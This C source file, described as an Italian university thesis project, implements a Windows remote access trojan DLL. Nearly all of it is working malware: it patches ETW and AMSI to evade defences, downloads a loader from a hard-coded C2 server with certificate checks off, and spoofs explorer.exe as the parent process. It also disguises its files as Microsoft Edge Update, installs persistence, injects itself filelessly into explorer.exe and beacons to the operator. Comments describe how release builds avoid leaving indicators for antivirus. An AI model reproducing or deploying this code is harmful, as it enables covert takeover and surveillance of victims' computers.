/*
 * rat.c — Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
 * Mode A: rundll32 (path DLL noto)
 * Mode B: reflective load via nostro loader EXE
 * Mode C: reflective load via stager/macro (PS/Word) → scarica loader EXE dal C2
 * Mode D: injected reflectivamente in processo di sistema (svchost, explorer) — fileless
 */

#include <windows.h>
#include <winhttp.h>
#include <wchar.h>
#include <tlhelp32.h>

#define C2_HOST L"192.168.42.124"
#define C2_PORT 443

static HINSTANCE g_hDll    = NULL;
static HANDLE    g_hThread = NULL;

void patch_etw(void);
void patch_amsi(void);
int  install_persistence(const wchar_t *exe_path, const wchar_t *arguments);
int  install_run_key(void);
int  install_persistence_modeD(void);
void beacon_loop(void);
int  inject_dll_into_explorer(void);   /* process_inject.c — T1055.003 */

#ifndef NDEBUG
/* _rat_dbg: scrive log su %TEMP%\rat_debug.txt.
 * Presente SOLO nelle build debug (senza -DNDEBUG).
 * Le build di release (Makefile usa -DNDEBUG) compilano la versione
 * no-op inline → zero file scritti su disco, zero IOC per AV/EDR. */
static void _rat_dbg(const char *step) {
    char path[MAX_PATH];
    GetTempPathA(MAX_PATH, path);
    lstrcatA(path, "rat_debug.txt");
    HANDLE hf = CreateFileA(path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
                            OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return;
    char buf[128];
    int n = wsprintfA(buf, "[rat] %s\r\n", step);
    DWORD dw;
    WriteFile(hf, buf, (DWORD)n, &dw, NULL);
    CloseHandle(hf);
}
#else
static inline void _rat_dbg(const char *step) { (void)step; }
#endif

static BOOL download_loader(const wchar_t *dest_path) {
    HINTERNET hSess = NULL, hConn = NULL, hReq = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    BOOL ok = FALSE;

    hSess = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) goto done;
    hConn = WinHttpConnect(hSess, C2_HOST, C2_PORT, 0);
    if (!hConn) goto done;
    hReq = WinHttpOpenRequest(hConn, L"GET", L"/loader", NULL,
                              WINHTTP_NO_REFERER,
                              WINHTTP_DEFAULT_ACCEPT_TYPES,
                              WINHTTP_FLAG_SECURE);
    if (!hReq) goto done;

    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA      |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID  |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) goto done;
    if (!WinHttpReceiveResponse(hReq, NULL)) goto done;

    hFile = CreateFileW(dest_path, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) goto done;

    BYTE buf[8192]; DWORD dwRead, dwWritten;
    while (WinHttpReadData(hReq, buf, sizeof(buf), &dwRead) && dwRead > 0)
        WriteFile(hFile, buf, dwRead, &dwWritten, NULL);
    ok = TRUE;
done:
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (hReq)  WinHttpCloseHandle(hReq);
    if (hConn) WinHttpCloseHandle(hConn);
    if (hSess) WinHttpCloseHandle(hSess);
    return ok;
}

static DWORD _get_explorer_pid(void) {
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = {0};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}

static void _launch_loader_exe(const wchar_t *exe_path) {
    HANDLE hParent = NULL;
    LPPROC_THREAD_ATTRIBUTE_LIST pAttr = NULL;
    SIZE_T cbAttr = 0;

    DWORD explorerPid = _get_explorer_pid();
    if (explorerPid)
        hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorerPid);

    InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttr);
    pAttr = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttr);
    if (!pAttr) goto cleanup;
    if (!InitializeProcThreadAttributeList(pAttr, 1, 0, &cbAttr)) goto cleanup;
    if (hParent) {
        if (!UpdateProcThreadAttribute(pAttr, 0,
                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                &hParent, sizeof(HANDLE), NULL, NULL))
            goto cleanup;
    }

    STARTUPINFOEXW siEx    = {0};
    siEx.StartupInfo.cb      = sizeof(siEx);
    siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    siEx.StartupInfo.wShowWindow = SW_HIDE;
    siEx.lpAttributeList = pAttr;

    PROCESS_INFORMATION pi = {0};
    wchar_t cmdline[MAX_PATH + 4];
    _snwprintf(cmdline, MAX_PATH + 3, L"\"%s\"", exe_path);

    if (CreateProcessW(NULL, cmdline, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
                       NULL, NULL, (LPSTARTUPINFOW)&siEx, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        _rat_dbg("launch_loader_ok_ppid");
    } else {
        _rat_dbg("launch_loader_fail");
    }

cleanup:
    if (pAttr) { DeleteProcThreadAttributeList(pAttr); HeapFree(GetProcessHeap(), 0, pAttr); }
    if (hParent) CloseHandle(hParent);
}

static DWORD WINAPI payload_thread(LPVOID lpParam) {
    (void)lpParam;
    _rat_dbg("thread_start");

    patch_etw();  _rat_dbg("after_patch_etw");
    patch_amsi(); _rat_dbg("after_patch_amsi");

    wchar_t wszDir[MAX_PATH] = {0};
    ExpandEnvironmentStringsW(L"%LOCALAPPDATA%\\Microsoft\\EdgeUpdate",
                              wszDir, MAX_PATH);
    CreateDirectoryW(wszDir, NULL);

    wchar_t wszDllPath[MAX_PATH] = {0};
    GetModuleFileNameW(g_hDll, wszDllPath, MAX_PATH);

    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    wchar_t wszExeDest[MAX_PATH] = {0};
    ExpandEnvironmentStringsW(
        L"%LOCALAPPDATA%\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe",
        wszExeDest, MAX_PATH);

    if (wszDllPath[0] != L'\0') {
        /* ── Mode A: DLL caricata con path noto (rundll32) ── */
        _rat_dbg("mode_A");
        wchar_t wszDllDest[MAX_PATH] = {0};
        ExpandEnvironmentStringsW(
            L"%LOCALAPPDATA%\\Microsoft\\EdgeUpdate\\msedge_update.dll",
            wszDllDest, MAX_PATH);
        if (_wcsicmp(wszDllPath, wszDllDest) != 0)
            CopyFileW(wszDllPath, wszDllDest, FALSE);

        wchar_t wszRundll32[MAX_PATH] = {0};
        GetSystemDirectoryW(wszRundll32, MAX_PATH);
        lstrcatW(wszRundll32, L"\\rundll32.exe");
        wchar_t wszArgs[MAX_PATH * 2] = {0};
        _snwprintf(wszArgs, MAX_PATH*2-1, L"\"%s\",Run", wszDllDest);
        install_persistence(wszRundll32, wszArgs);

        CoUninitialize();
        _rat_dbg("before_beacon_loop");
        beacon_loop();

    } else {
        wchar_t wszHostExe[MAX_PATH] = {0};
        GetModuleFileNameW(NULL, wszHostExe, MAX_PATH);

        wchar_t *pBase = wcsrchr(wszHostExe, L'\\');
        const wchar_t *hostBase = pBase ? pBase + 1 : wszHostExe;

        BOOL bModeB = (_wcsicmp(hostBase, L"MicrosoftEdgeUpdate.exe") == 0);

        /* Mode D: iniettato reflectivamente in un processo di sistema trusted */
       BOOL bModeD = (!bModeB &&
               (_wcsicmp(hostBase, L"svchost.exe")      == 0 ||
                _wcsicmp(hostBase, L"explorer.exe")      == 0 ||
                _wcsicmp(hostBase, L"RuntimeBroker.exe") == 0 ||
                _wcsicmp(hostBase, L"powershell.exe")    == 0 ||
                _wcsicmp(hostBase, L"sihost.exe")        == 0 ||
                _wcsicmp(hostBase, L"dllhost.exe")       == 0 ||
                _wcsicmp(hostBase, L"EXCEL.EXE")         == 0));

        if (bModeB) {
            /* ── Mode B: già dentro MicrosoftEdgeUpdate.exe ── */
            _rat_dbg("mode_B");
            if (wszHostExe[0] != L'\0' && _wcsicmp(wszHostExe, wszExeDest) != 0)
                CopyFileW(wszHostExe, wszExeDest, FALSE);
            install_persistence(wszExeDest, L"");
            CoUninitialize();
            _rat_dbg("before_beacon_loop");
            beacon_loop();

        }  else if (bModeD) {
            _rat_dbg("mode_D");
            install_persistence_modeD();   /* L1 task + L2 run key + L3 startup */
            _rat_dbg("before_beacon_loop");
            beacon_loop();

        } else {
            /* ── Mode C: stager PowerShell / macro ── */
            _rat_dbg("mode_C");

            /* ── Fileless injection in explorer.exe (T1055.003) ───────────
             * Scarica rat.dll cifrata dal C2, la decripta in RAM e la inietta
             * in explorer.exe via NtCreateSection + NtMapViewOfSection.
             * Eseguita in parallelo alla persistenza su disco: se ha successo
             * il payload gira in un processo trusted anche se loader.exe
             * non è raggiungibile o viene rimosso dall'AV. */
            if (inject_dll_into_explorer() == 0)
                _rat_dbg("inject_explorer_ok");
            else
                _rat_dbg("inject_explorer_fail");

            BOOL bOk = download_loader(wszExeDest);
            _rat_dbg(bOk ? "download_ok" : "download_fail");
            install_persistence(wszExeDest, L"");
            if (bOk) {
                _launch_loader_exe(wszExeDest);
                CoUninitialize();
            } else {
                CoUninitialize();
                _rat_dbg("before_beacon_loop_fallback");
                beacon_loop();
            }
        }
    }

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    (void)lpvReserved;
    if (fdwReason == DLL_PROCESS_ATTACH) {
        g_hDll = hinstDLL;
        DisableThreadLibraryCalls(hinstDLL);
        _rat_dbg("DllMain_attach");
        if (g_hThread == NULL)
            g_hThread = CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);
    }
    return TRUE;
}

__declspec(dllexport)
void WINAPI Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    (void)hwnd; (void)hinst; (void)lpszCmdLine; (void)nCmdShow;
    _rat_dbg("Run_called");
    if (g_hThread)
        WaitForSingleObject(g_hThread, INFINITE);
    else {
        g_hThread = CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);
        if (g_hThread) WaitForSingleObject(g_hThread, INFINITE);
        else { _rat_dbg("CreateThread_failed"); Sleep(INFINITE); }
    }
}
